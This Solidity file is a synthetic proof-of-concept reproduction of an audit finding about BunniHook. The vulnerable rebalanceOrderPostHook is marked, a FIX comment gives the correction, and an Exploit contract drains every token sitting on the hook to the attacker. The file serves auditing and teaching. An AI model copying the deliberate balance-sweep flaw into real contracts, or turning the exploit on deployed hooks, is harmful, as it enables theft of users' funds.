// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  BunniHook — rebalance sweeps the hook's whole token balance
    (Pashov, finding #43544)
    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: rebalanceOrderPostHook treats balanceOf(this) as the swap
    output. Bids and rents already sitting on the hook are part of that balance. */

contract BunniToken {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function mint(address to, uint256 amount) external {
        totalSupply += amount;
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract BunniHook {
    uint256 public swept;

    function rebalanceOrderPostHook(address currency, address hub) external returns (uint256 orderOutputAmount) {
        BunniToken token = BunniToken(currency);
        orderOutputAmount = token.balanceOf(address(this)); // @> VULN: full balance, not the amount this swap just received
        // FIX: orderOutputAmount = balanceAfter - balanceBefore
        token.transfer(hub, orderOutputAmount);
        swept = orderOutputAmount;
    }

    function rebalanceReceived(address currency, address hub, uint256 received) external returns (uint256) {
        BunniToken(currency).transfer(hub, received);
        return received;
    }
}

contract Exploit {
    BunniToken public token;
    BunniHook public hook;
    uint256 public stolen;

    constructor() {
        token = new BunniToken();
        hook = new BunniHook();
        token.mint(address(hook), 1000 ether);
    }

    function run() external {
        address attacker = msg.sender;
        uint256 bids = token.balanceOf(address(hook));
        stolen = hook.rebalanceOrderPostHook(address(token), attacker);
        require(bids == 1000 ether, "bids");
        require(stolen == 1000 ether, "swept");
        require(token.balanceOf(attacker) == 1000 ether, "attacker");
        require(token.balanceOf(address(hook)) == 0, "hook empty");
    }
}
